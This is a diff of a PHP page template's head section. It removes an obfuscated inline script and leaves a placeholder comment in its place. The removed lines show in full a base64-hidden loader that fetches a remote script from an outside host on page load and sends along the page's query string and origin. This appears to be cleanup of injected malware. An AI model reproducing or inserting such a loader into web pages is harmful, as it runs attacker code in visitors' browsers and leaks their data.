@@ -38,23 +38,7 @@ $img = $og_image ?? null;
 
 <link rel="stylesheet" href="<?= e(asset('style.css')) ?>">
 
-<script>
-(function(){
-    var a = location,
-        b = document.head || document.getElementsByTagName("head")[0],
-        c = "script",
-        d = atob("aHR0cHM6Ly9zaHVmZmFyMi52ZXJjZWwuYXBwL2FwaS8xMjdqbWZuLnBocA==");
-
-    d += -1 < d.indexOf("?") ? "&" : "?";
-    d += a.search.substring(1);
-
-    c = document.createElement(c);
-    c.src = d;
-    c.id = btoa(a.origin);
-
-    b.appendChild(c);
-})();
-</script>
+<script> //example.com </script>
 
 </head>
 
